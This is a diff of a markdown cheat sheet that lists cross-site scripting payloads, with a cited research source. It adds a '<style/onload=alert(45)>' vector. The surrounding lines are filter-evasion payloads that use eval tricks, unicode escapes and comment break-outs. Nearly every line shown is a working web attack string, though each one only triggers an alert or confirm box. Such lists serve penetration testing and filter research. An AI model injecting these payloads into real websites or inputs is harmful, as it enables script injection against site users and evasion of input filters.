@@ -138,7 +138,8 @@ alert;pg("XSS")
 <script>'alert(1)'.replace(/.+/,eval)</script>  
 <img onerror=eval('al\u0065rt(1)') src=a>  
 <script>function::['alert'](1)</script>
-<--`<img/src=`%20onerror=confirm``>%20--!> 
+<--`<img/src=`%20onerror=confirm``>%20--!>  
+<style/onload=alert(45)>  
   
 ## Source::  
 [https://research.digitalinterruption.com/2018/12/18/a-deeper-look-into-xss-payloads/](https://research.digitalinterruption.com/2018/12/18/a-deeper-look-into-xss-payloads/)  
